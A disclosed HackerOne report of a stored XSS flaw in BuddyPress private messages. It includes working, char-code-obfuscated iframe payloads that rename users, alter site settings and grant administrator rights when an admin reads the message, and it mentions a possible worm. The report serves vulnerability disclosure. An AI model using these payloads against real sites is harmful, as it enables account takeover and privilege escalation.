# Stored XSS in Private Message component (BuddyPress)

## Report Details
- **Report ID**: 487081
- **URL**: https://hackerone.com/reports/487081
- **State**: Closed
- **Severity**: critical
- **Submitted**: 2019-01-28T07:45:00.790Z
- **Disclosed**: 2019-03-08T22:28:04.374Z

## Reporter
- **Username**: klmunday
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: wordpress

## Vulnerability Information
## Description:
WordPress version: **5.0.3**
BuddyPress version: **4.1.0**

Users with accounts can send private messages containing rendered HTML to other uses, this includes being able to execute javascript code via elements such as scripts, iframe etc. The XSS is stored in the database and is triggered any time a user reads the message. This includes the message preview window which shows the last message the user has received (or sent).

The code which runs can be exploited to perform any action that the "Victim" has permissions for, this is especially dangerous for privileged users such as administrators since it allows access to the WordPress settings and private information such as users emails. This includes any actions for other plugins etc.

The only prerequisites for this is that private messaging is enabled in the BuddyPress settings and that the attacker has an account (with default permissions).

## Steps To Reproduce:
Via composing a new message
1. Go to another users profile
2. Click private message
3. Type any subject
4. Type the following message  `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
5. Send the message
6. View the message (triggers the XSS)
7. Wait for the victim to read the message

Via replying to an existing thread
1. Go to your inbox
2. View any message you have received
3. Respond to the message with `Test<iframe src=javascript:alert(1) width=0 height=0 style=display:none;></iframe>`
4. View the message (triggers the XSS)
5. Wait for the victim to read the message

Payloads containing spaces can also be sent however the src cannot contain any spaces or quotations so it needs to be converted into char codes, combined into a string and eval'd:
**example:**
```
<iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,116,101,115,116,32,61,32,49,50,51,59,10,97,108,101,114,116,40,116,101,115,116,41,59])) width=0 height=0 style=display:none;></iframe>
```
**would run**
```javascript
let test = 123;
alert(test);
```

Larger payloads can be used. However, due to the code needing to be in an array of char codes (if it contains spaces or quotations) I have written a small python script to convert javascript code into a sendable message. It also includes some Proof of concept payloads which perform the following:
- Change the users username to `HACKED` (affects any user)
- Change the websites title and description (requires a privileged user to read the message)
- Change a users permissions to administrator (requires a privileged user to read the message)

Please see the attached zip file for the script and payloads (they have not been pre-converted)

See some example payloads below: 
(note: the spacing is to prevent the iframe element being visible in the message exert displayed in the inbox - it is not required for it to work, nor is the start of the message, only the iframe is needed).
**Change username to `HACKED`**
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,97,109,101,32,61,32,112,97,114,101,110,116,46,66,80,95,78,111,117,118,101,97,117,46,109,101,115,115,97,103,101,115,46,114,111,111,116,85,114,108,46,115,112,108,105,116,40,39,47,39,41,91,50,93,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,109,101,109,98,101,114,115,47,39,32,43,32,110,97,109,101,32,43,32,39,47,112,114,111,102,105,108,101,47,101,100,105,116,47,103,114,111,117,112,47,49,47,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,102,105,101,108,100,95,49,34,93,39,41,46,118,97,108,40,39,72,65,67,75,69,68,39,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,35,112,114,111,102,105,108,101,45,101,100,105,116,45,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59,10])) width=0 height=0 style=display:none;></iframe>
```

**Change site title and description:** (requires admin to read message)
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,110,101,119,95,115,105,116,101,95,116,105,116,108,101,32,61,32,39,72,65,67,75,69,68,39,59,10,108,101,116,32,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,32,61,32,39,118,105,97,32,88,83,83,39,59,10,108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,45,103,101,110,101,114,97,108,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,110,97,109,101,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,116,105,116,108,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,105,110,112,117,116,91,110,97,109,101,61,34,98,108,111,103,100,101,115,99,114,105,112,116,105,111,110,34,93,39,41,46,118,97,108,40,110,101,119,95,115,105,116,101,95,100,101,115,99,114,105,112,116,105,111,110,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,111,112,116,105,111,110,115,46,112,104,112,39,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
```

**Change user permissions for the user with id `2` to administrator** (requires admin to read message)
```
This is a malicious message.                    <iframe src=javascript:eval(String.fromCharCode.apply(null,[108,101,116,32,117,114,108,32,61,32,112,97,114,101,110,116,46,108,111,99,97,116,105,111,110,46,111,114,105,103,105,110,32,43,32,39,47,119,112,45,97,100,109,105,110,47,117,115,101,114,45,101,100,105,116,46,112,104,112,63,117,115,101,114,95,105,100,61,50,38,119,112,95,104,116,116,112,95,114,101,102,101,114,101,114,61,47,119,112,45,97,100,109,105,110,47,117,115,101,114,115,46,112,104,112,39,59,10,10,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,117,114,108,44,32,116,121,112,101,58,32,39,71,69,84,39,44,32,115,117,99,99,101,115,115,58,32,102,117,110,99,116,105,111,110,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,32,123,10,32,32,32,32,108,101,116,32,100,111,109,32,61,32,112,97,114,101,110,116,46,106,81,117,101,114,121,40,104,116,109,108,95,114,101,115,112,111,110,115,101,41,59,10,32,32,32,32,100,111,109,46,102,105,110,100,40,39,115,101,108,101,99,116,91,110,97,109,101,61,34,114,111,108,101,34,93,39,41,46,112,114,111,112,40,34,115,101,108,101,99,116,101,100,73,110,100,101,120,34,44,32,52,41,59,10,32,32,32,32,112,97,114,101,110,116,46,106,81,117,101,114,121,46,97,106,97,120,40,123,117,114,108,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,97,116,116,114,40,39,97,99,116,105,111,110,39,41,44,32,116,121,112,101,58,32,39,80,79,83,84,39,44,32,100,97,116,97,58,32,100,111,109,46,102,105,110,100,40,39,102,111,114,109,39,41,46,115,101,114,105,97,108,105,122,101,40,41,125,41,10,125,125,41,59])) width=0 height=0 style=display:none;></iframe>
```

For a more detailed write-up including images please view this [Google Doc (unlisted)](https://docs.google.com/document/d/1RgMWJlYen9iR_JTxATYR4TJWAPKRgaSKuiiqZp7x8L0/edit?usp=sharing) (if this is not allowed please let me know so that I can include them here if necessary)

## Impact

An attacker could craft a payload to perform any action which their target can perform. This is especially dangerous for administrators since if the attacker targeted them they could modify site data/content, modify accounts, read sensitive information such as users private information and more.

In my testing I was able to change profile names, change users passwords, read users email addresses, modify pages, modify the site data and modify the WordPress settings including the sites email address.

I did not find anything I could not exploit which the targeted user had permissions to do, it seems depending on the target that the attacker can achieve full access to wp-admin and any other plugins that are installed and even chain requests together within a single attack.

It would also be possible to create a worm which when read would email its content to every other user again.

## Attachments
- BuddyPress_XSS_PoC.zip
